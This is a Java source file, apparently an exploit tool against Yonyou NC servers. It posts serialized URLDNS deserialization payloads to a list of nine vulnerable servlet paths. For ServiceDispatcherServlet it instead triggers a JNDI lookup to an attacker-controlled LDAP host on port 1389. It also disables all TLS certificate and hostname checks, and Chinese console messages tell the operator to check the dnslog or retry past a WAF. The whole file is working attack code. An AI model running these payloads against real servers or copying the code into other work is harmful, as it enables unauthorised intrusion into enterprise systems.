package test;

import java.io.ObjectOutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.HashMap;
import java.util.Properties;
import java.util.zip.GZIPOutputStream;
import javax.net.ssl.HostnameVerifier;
import javax.net.ssl.HttpsURLConnection;
import javax.net.ssl.SSLSession;

import nc.bs.framework.common.NCLocator;
import payloads.*;

public class Expliot {
	public Expliot(String url, String servletname, String dnslog) throws Exception {
		if (servletname.equals("ServiceDispatcherServlet")) {
	    	Properties env = new Properties();
	        env.put("SERVICEDISPATCH_URL", url+servletname);
	        NCLocator locator = NCLocator.getInstance(env);
	        locator.lookup("ldap://"+dnslog+":1389/test");
		} else {
    		try {
    			dopost(url, servletname, dnslog);
    			System.out.println("访问"+servletname+"成功，请查看dnslog");
			} catch (Exception e) {
				System.out.println("可能存在waf拦截序列化数据流，请手动尝试");
			}
		}

	}
	
	public void dopost(String url, String servletname, String dnslog) throws Exception {
        URL servleturl = new URL(url+getServleturl(servletname));
        trustAllHttpsCertificates();
        HostnameVerifier hv = new HostnameVerifier() {
			public boolean verify(String hostname, SSLSession session) {
				return true;
			}
        };
        HttpsURLConnection.setDefaultHostnameVerifier(hv);
        HttpURLConnection connection = (HttpURLConnection) servleturl.openConnection();
        connection.setRequestMethod("POST");
        connection.setInstanceFollowRedirects(false);
        connection.setConnectTimeout(10000);
        connection.setReadTimeout(10000);
        connection.setDoOutput(true);
        if (servletname.equals("ActionHandlerServlet")) {
        	GZIPOutputStream gzip = new GZIPOutputStream(connection.getOutputStream());
        	gzip.write(Gzipbs.tobytes(Urldns.exec(dnslog)));
        	gzip.close();
		} else {
	        ObjectOutputStream oos = new ObjectOutputStream(connection.getOutputStream());
	        oos.writeObject(Urldns.exec(dnslog));
		}
        connection.connect();
        connection.getResponseCode();
	}
	
	public static String getServleturl(String servletname){
    	HashMap servlet = getservletmap();
		if (servlet.containsKey(servletname)){
			return (String) servlet.get(servletname);
		} else {
			return servletname;
		}
    }
    private static HashMap getservletmap() {
    	HashMap servlet = new HashMap();
		servlet.put("MonitorServlet", "servlet/~ic/nc.bs.framework.mx.monitor.MonitorServlet");
		servlet.put("MxServlet", "servlet/~ic/nc.bs.framework.mx.MxServlet");
		servlet.put("XbrlPersistenceServlet", "servlet/~uapxbrl/uap.xbrl.persistenceImpl.XbrlPersistenceServlet");
		servlet.put("FileReceiveServlet", "servlet/~uapss/com.yonyou.ante.servlet.FileReceiveServlet");
		servlet.put("DownloadServlet", "servlet/~ic/nc.document.pub.fileSystem.servlet.DownloadServlet");
		servlet.put("UploadServlet", "servlet/~ic/nc.document.pub.fileSystem.servlet.UploadServlet");
		servlet.put("DeleteServlet", "servlet/~ic/nc.document.pub.fileSystem.servlet.DeleteServlet");
		servlet.put("ActionHandlerServlet", "servlet/~ic/com.ufida.zior.console.ActionHandlerServlet");
		servlet.put("ServiceDispatcherServlet", "ServiceDispatcherServlet");
		return servlet;
	}
	private static void trustAllHttpsCertificates() throws Exception {
        javax.net.ssl.TrustManager[] trustAllCerts = new javax.net.ssl.TrustManager[1];
        javax.net.ssl.TrustManager tm = new miTM();
        trustAllCerts[0] = tm;
        javax.net.ssl.SSLContext sc = javax.net.ssl.SSLContext.getInstance("SSL");
        sc.init(null, trustAllCerts, null);
        javax.net.ssl.HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());
    }
    static class miTM implements javax.net.ssl.TrustManager, javax.net.ssl.X509TrustManager {
        public java.security.cert.X509Certificate[] getAcceptedIssuers() {
            return null;
        }

        public boolean isServerTrusted(java.security.cert.X509Certificate[] certs) {
            return true;
        }

        public boolean isClientTrusted(java.security.cert.X509Certificate[] certs) {
            return true;
        }

        public void checkServerTrusted(java.security.cert.X509Certificate[] certs, String authType)
                throws java.security.cert.CertificateException {
            return;
        }

        public void checkClientTrusted(java.security.cert.X509Certificate[] certs, String authType)
                throws java.security.cert.CertificateException {
            return;
        }
    }
}
